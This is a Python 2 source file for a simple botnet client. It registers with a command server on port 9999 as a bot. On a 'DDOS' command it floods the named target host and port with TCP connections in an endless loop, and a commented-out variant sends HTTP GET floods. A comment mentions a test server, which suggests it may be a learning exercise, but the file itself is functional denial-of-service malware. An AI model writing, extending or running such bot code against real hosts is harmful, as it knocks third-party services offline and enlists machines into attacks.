#!/usr/bin/python           # This is client.py file
import sys
import urllib
import socket               # Import socket module
#from clickspam import keyclick

def attack(host="",port=80):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"Error:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"Unresolved hostname."
            sys.exit()
        else:
            packet = str('DDOS').encode('utf-8')
            if sock.connect_ex((host,port)) == 0:
                if sock.sendall(packet) == None:
                    #print"Packet sent successfully!"
					#The line below is required for testing with ddos_test_server
                    print sock.recv(1024)        # Prints echo from test_server
                    sock.close()
                else:
                    print"Error while sending!"
                    sys.exit()

if __name__ == "__main__":
	s = socket.socket()         # Create a socket object
	host = socket.gethostname() # Get local machine name
	port = 9999                # Reserve a port for your service.

	s.connect((host, port))
	s.send("I HAVE INITATED BOT")


	while True:
		cmd = s.recv(1024)
		print(cmd)
		cmd_type= cmd.split()
		if(cmd_type[1]=='DDOS'):
			print('DDos functionality')
			target_host, target_port = cmd_type[2:]
			target_port = int(target_port)
			print 'Target Host Address: '+target_host+ \
				  '\nTarget Port Number: '+str(target_port)
			s.close()
			while True:
				attack(target_host, target_port)



# def attack():
#     #pid = os.fork()
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.connect((sys.argv[1], 80))
#     print ">> GET /" + receive[2] + " HTTP/1.1"
#     s.send("GET /" + receive[2] + " HTTP/1.1\r\n")
#     s.send("Host: " + receive[1]  + "\r\n\r\n");
#     s.close()



s.close()                     # Close the socket when done
